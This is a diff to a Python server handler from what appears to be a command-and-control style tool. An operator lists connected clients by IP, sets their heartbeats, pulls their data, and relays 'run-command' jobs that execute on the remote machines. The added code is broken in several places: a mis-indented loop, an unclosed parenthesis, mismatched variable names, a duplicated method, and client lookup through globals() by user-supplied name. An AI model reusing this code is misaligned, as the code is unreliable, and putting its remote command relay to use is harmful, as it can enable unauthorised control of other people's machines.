@@ -215,6 +215,7 @@ class ServerFriendlyClientHandler:
         self.add = None
         self.ip = None
         self.port = None
+        self.current_client_list = None
 
         self.Sx21 = f"[Friendly Client: {self.ip}:{self.port}] conn_broken_pipe: A pipe was broken f"
 
@@ -242,26 +243,142 @@ class ServerFriendlyClientHandler:
             except:
                 logging.debug(f"Error with username or command, input={raw_user_input}")
 
-            
+    def server_decision_tree(self, message):
+        """
+        Handles commands meant directly for the server
+        """
+        self.current_client_refresh()
+
+        if message == "clients":
+            if self.current_client_list != "":
+                self.send_msg(self.current_clientlist)
+                ##== these can generate a lot of  messages very quickly, leaving disabled for now
+                #logging.debug(f"[] Current Clients: {self.current_client_list}")
+            else:
+                self.send_msg("No Current Clients")
+
+        elif message == "stats":
+            pass
+            ## Need: client instance name
+            ## then call: client_instance.stats
+        else:
+            self.client_decision_tree(message)
+
+    def client_decision_tree(self, raw_message):
+        """
+        Handles commands  meant for the clients,  passed through the server
+        """
+        pass
+    
+    def current_client_refresh(self) -> None:
+        """
+        Checks & adds any new clients to the self.current_client_list list
+        """
+        self.current_client_list = ""
+            for current_client in globals():
+                if current_client.startswith("client_"):
+                    self.current_client_list += f"{current_client}\n"
+
 
 ################
 ## Client Fucntions
 ################ 
+"""
+    ## If the job is not meant for the server, it filters down to here.
+    ## this interacts with the self.clients interact function, which sets jobs 
+    ## for the event loop to do on heartbeats
 
-## If the job is not meant for the server, it filters down to here.
-## this interacts with the self.clients interact function, which sets jobs 
-## for the event loop to do on heartbeats
+    ## TLDR: This sets jobs or gets current data from the current selected client
 
-## TLDR: This sets jobs or gets current data from the current selected client
+    #                           Action      Value    Target Client 
+    #requests look like this: set-heartbeat 15 client_127_0_0_1_FCECW
 
-#                           Action      Value    Target Client 
-#requests look like this: set-heartbeat 15 client_127_0_0_1_FCECW
+"""
+    def client_decision_tree(self, raw_message):
+        message = self.parse_msg_for_client(raw_message)
+        #logging.debug(f"RawMessage={raw_message}")
+        #logging.debug(f"ParsedMessage{message}")
+
+        ## No try except due to parse_msg_for_X having builtin handling
+        client_command = message[0]
+        client_command_value = message[1]
+        ##== Client name is always last
+        client_name = message[-1]
 
 
-##! Up next, per client, and then after that, friendlt client classes
+        self.client = globals()[client_name]
+        if client_name in self.current_clientlist:
+            pass
+        else:
+            logging.debug(f"[Server] Client {self.client} not found")
+        
+        # == Static, From Server, validated
+        if client_command == "get-data":
+            data = f"{self.client.data_list}"
+            self.send_msg(data)  
+
+        # == Dynamic, To Client, validated
+        elif client_command == "set-heartbeat":
+            heartbeat_value = client_command_value
+            logging.debug(f"[Server: Username] Setting Heartbeat of {heartbeat_value} for {self.client}")
+            
+            self.client.interact("set-heartbeat", heartbeat_value)
+            ## sanity check
+            if self.client.current_job == f"set-heartbeat\\|/{heartbeat_value}":
+                ## == Message back to client
+                self.send_msg(f"Heartbeat queued to be set to: {heartbeat_value}"
+            
+            else:
+                self.send_msg(f"Error setting heartbeat for {self.client}")
+                logging.debug(f"Error setting heartbeat for {self.client}")   
+        
+               # == Dynamic, To Client
+        elif client_command == "run-command":
+            ## Sending back results of command run
+            self.send_msg(self.client.interact("run-command", client_command_value))
+
+    def send_msg(self, message:str):
+        try:
+            HEADERSIZE = 10
+            message = f"{len(message):<{HEADERSIZE}}" + message
+            #print(message)
+            #print("---head--|msg->")
+            #print(f"Message being sent back to fclient: {message}")
+            encoded_response = str_encode(message)
+            self.conn.send(encoded_response)
+
+        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+            ## nuking the class on an error... could be better.
+            ##Class gets respawned on next heartbeat
+            exit()
+
+    ##== Dev Note!! These need to always return SOMETHING in their lists, 
+    ## that way it's  played safely and doesnt error  out
+    def parse_msg_for_server(self, raw_message) -> list:
+        print(f"Raw Message: {raw_message}")  if global_debug else None
+        
+        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
+        try:
+            parsed_results_list = raw_message.replace("!_usercommand_!\\|/","").split("//|\\\\")
+        except:
+            parsed_results_list = ["EMPTY","EMPTY"]
+
+        return parsed_results_list
+    
+    def parse_msg_for_client(self, raw_message) -> list:
+        #print(f"Raw Message: {raw_message}")  if global_debug else None
+        
+        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
+        try:
+            parsed_results_list = raw_message.split()
+        except:
+            parsed_results_list = ["EMPTY","EMPTY","EMPTY"]
+        
+        #print(f"Parsed Message: {parsed_results_list}") if global_debug else None
+        return parsed_results_list
 
 
-
+## perclient & interact left
 
 ################
 ## QOL Functions
